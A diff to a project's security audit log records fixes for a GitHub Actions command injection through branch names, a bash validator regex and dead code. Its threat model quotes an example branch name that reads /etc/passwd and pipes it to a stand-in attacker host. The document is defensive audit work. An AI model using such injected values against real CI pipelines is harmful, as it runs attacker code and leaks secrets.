@@ -162,6 +162,54 @@ Phase 2.1 затворит surface окончательно.
 
 ---
 
+## Phase 2 Round 1 Audit Fixes (Stage 1B)
+
+**Date**: 2026-05-08  
+**Fixer Stage**: 1B (CI security quick wins)  
+**Audit Round**: PROB-060 Phase 2 Round 1
+
+### HIGH-2: git push RCE via github.head_ref interpolation [CWE-94]
+
+**File**: `.github/workflows/assign-id.yml:120`
+
+**Fix**: 
+- Line 116: Added `HEAD_REF: ${{ github.head_ref }}` env var (mirrors COMMIT_MSG pattern from lines 99-105)
+- Lines 124-128: Added whitelist validation before use: `[[ "$HEAD_REF" =~ ^[A-Za-z0-9._/-]+$ ]]` with fail-closed error
+- Line 134: Changed from direct interpolation `git push origin HEAD:${{ github.head_ref }}` to env-var safe syntax `git push origin "HEAD:refs/heads/$HEAD_REF"`
+
+**Threat model**: Branch names containing `$()`, backticks, pipes trigger RCE in runner's GITHUB_TOKEN context (write to contents + PRs). Fork PR with `evil$(cat /etc/passwd | curl attacker.com)` as branch name would execute arbitrary code.
+
+**Documentation**: Added inline comment block (lines 107-111) explaining CWE-94 defense pattern.
+
+### HIGH-5: bash validator SLUG_REGEX missing mem prefix
+
+**File**: `.github/scripts/validate-forgeplan-frontmatter.sh:20`
+
+**Fix**:
+- Line 20: Updated `SLUG_REGEX` from `^(prd|rfc|adr|epic|spec|prob|sol|evid|note|ref)-...` to `^(prd|rfc|adr|epic|spec|prob|sol|evid|note|ref|mem)-...`
+- Removed unused `ARTIFACT_KINDS` array (line 23 in original) — single source of truth is now the regex
+
+**Issue**: Rust core treats `mem` as first-class artifact kind (types.rs:136), but bash validator didn't. Caused false-positive rejection: `mem-architecture-context.md` rejected by bash but accepted by Rust.
+
+### LOW-3: Redundant branch in assigned_number_changed
+
+**File**: `.github/scripts/validate-forgeplan-frontmatter.sh:71-78` (original) → **lines 76-77 (after fix)**
+
+**Fix**: Removed dead `if` branch that computed the same comparison twice:
+- Before: `if [[ -z ... ]]; then [[ "$current" != "$previous" ]]; return $?; fi` followed by identical `[[ "$current" != "$previous" ]]`
+- After: Single line `[[ "$current" != "$previous" ]]` with comment explaining semantics
+
+**Hygiene**: Dead code removal, no functional change. Bash return semantics: `[[ a != b ]]` returns 0 (success) if different, 1 if same.
+
+### Validation
+
+- [x] `bash -n validate-forgeplan-frontmatter.sh` ✓
+- [x] `python3 -c yaml.safe_load(.github/workflows/assign-id.yml)` ✓
+- [x] `cargo check --workspace` ✓ (no regressions)
+- [x] `cargo test --lib` ✓ (all pass)
+
+---
+
 ## Tracking
 
 - **Phase 2.1 productionization** — backlog: rebuild binary из
@@ -171,3 +219,4 @@ Phase 2.1 затворит surface окончательно.
   использует heredoc + env-var pattern (regression guard на Part A).
 - **Validation gate tests** — integration tests for frontmatter validator
   (Phase 2 cleanup, nice-to-have).
+- **HEAD_REF validation regression guard**: CI should verify branch name whitelist regex remains `^[A-Za-z0-9._/-]+$` in assign-id.yml:124 (prevent silent removal of validation)
